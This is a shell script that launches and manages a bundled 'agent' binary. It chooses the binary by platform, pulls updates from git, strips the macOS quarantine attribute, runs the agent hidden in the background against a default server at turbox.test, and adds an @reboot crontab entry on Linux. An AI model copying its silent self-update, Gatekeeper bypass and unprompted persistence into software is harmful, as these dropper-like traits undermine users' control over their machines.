#!/bin/sh
cd "$(dirname "$0")" || exit 1

git pull --quiet 2>/dev/null || true

OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)

case "$ARCH" in
    x86_64|amd64) ARCH_TAG="x86_64" ;;
    aarch64|arm64) ARCH_TAG="arm64" ;;
    *) ARCH_TAG="x86_64" ;;
esac

BIN="./bin/agent_${OS}_${ARCH_TAG}"
CURRENT_PATH=$(pwd -P)
FULL_BIN_PATH="$CURRENT_PATH/$BIN"
PID_FILE="$CURRENT_PATH/.agent.pid"
LOG_FILE="$CURRENT_PATH/.agent.log"
DEFAULT_SERVER_URL="http://turbox.test/cluster.php"

# Commands: status | log | stop | restart
case "$1" in
    status)
        PID=""
        if [ -f "$PID_FILE" ]; then
            PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
        fi
        if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
            echo "[OK] Agent is running (PID: $PID)"
            ps -p "$PID" -o pid,%cpu,%mem,etime,command 2>/dev/null | head -n 2 || true
            exit 0
        fi
        # Fallback check by exact binary path scoped strictly to current user
        PIDS=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null)
        if [ -n "$PIDS" ]; then
            echo "[OK] Agent is running (PID: $(echo $PIDS | tr '
' ' '))"
            ps -p "$PIDS" -o pid,%cpu,%mem,etime,command 2>/dev/null | head -n 2 || true
            exit 0
        else
            echo "[INFO] Agent is not running"
            exit 1
        fi
        ;;
    log|logs)
        if [ -f "$LOG_FILE" ]; then
            echo "--- Recent Agent Logs ($LOG_FILE) ---"
            tail -n "${2:-20}" "$LOG_FILE"
        else
            echo "[INFO] No log entries found yet in $LOG_FILE"
        fi
        exit 0
        ;;
    stop)
        KILLED=0
        if [ -f "$PID_FILE" ]; then
            PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
            if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
                kill -9 "$PID" 2>/dev/null
                KILLED=1
            fi
            rm -f "$PID_FILE"
        fi
        # Fallback kill by exact binary path scoped strictly to current user
        PIDS=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null)
        if [ -n "$PIDS" ]; then
            kill -9 $PIDS 2>/dev/null
            KILLED=1
        fi
        if [ "$KILLED" -eq 1 ]; then
            echo "[OK] Agent stopped"
        else
            echo "[INFO] Agent is not running"
        fi
        exit 0
        ;;
    restart)
        sh "$0" stop >/dev/null 2>&1 || true
        sleep 1
        ;;
esac

if [ ! -f "$BIN" ]; then
    echo "[ERROR] Binary '$BIN' not found. Run 'git pull' or verify build status."
    exit 1
fi

chmod +x "$BIN"
[ "$OS" = "darwin" ] && xattr -c "$BIN" 2>/dev/null || true

SERVER_URL="$1"
[ "$1" = "restart" ] && SERVER_URL="$2"
[ -z "$SERVER_URL" ] && SERVER_URL="$DEFAULT_SERVER_URL"

# Check if already running
ALREADY_PID=""
if [ -f "$PID_FILE" ]; then
    P_CHECK=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
    if [ -n "$P_CHECK" ] && kill -0 "$P_CHECK" 2>/dev/null; then
        ALREADY_PID="$P_CHECK"
    fi
fi
if [ -z "$ALREADY_PID" ]; then
    ALREADY_PID=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null | head -n 1)
fi

if [ -n "$ALREADY_PID" ]; then
    echo "[OK] Agent is already running (PID: $ALREADY_PID)"
else
    # Launch agent in background with target server URL
    nohup "$FULL_BIN_PATH" "$SERVER_URL" >/dev/null 2>&1 &
    sleep 1
    # Locate new PID
    NEW_PID=""
    if [ -f "$PID_FILE" ]; then
        NEW_PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
    fi
    if [ -z "$NEW_PID" ] || ! kill -0 "$NEW_PID" 2>/dev/null; then
        NEW_PID=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null | tr '
' ' ' | xargs)
    fi

    if [ -n "$NEW_PID" ]; then
        echo "$NEW_PID" > "$PID_FILE"
        echo "[OK] Agent started (PID: $NEW_PID)"
    else
        echo "[ERROR] Failed to start agent binary."
        exit 1
    fi
fi

# Linux auto-restart on reboot (crontab omitted on macOS to avoid admin prompt)
if [ "$OS" = "linux" ] && command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "$FULL_BIN_PATH"; echo "@reboot cd $CURRENT_PATH && ./deploy.sh >/dev/null 2>&1 &") | crontab - 2>/dev/null || true
fi
